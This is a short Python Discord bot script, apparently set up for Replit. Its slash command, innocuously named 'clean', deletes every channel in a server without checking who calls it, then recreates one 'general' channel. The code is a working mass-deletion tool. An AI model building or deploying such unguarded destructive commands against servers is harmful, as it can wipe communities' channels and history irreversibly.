import discord
from discord import app_commands
from discord.ext import commands
import os

TOKEN = os.environ.get("TOKEN")  # We'll add this in Replit

intents = discord.Intents.default()
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot is online")

@bot.tree.command(name="clean")
async def clean(interaction: discord.Interaction):
    guild = interaction.guild
    for channel in guild.channels:
        await channel.delete()
    await guild.create_text_channel("general")

bot.run(TOKEN)
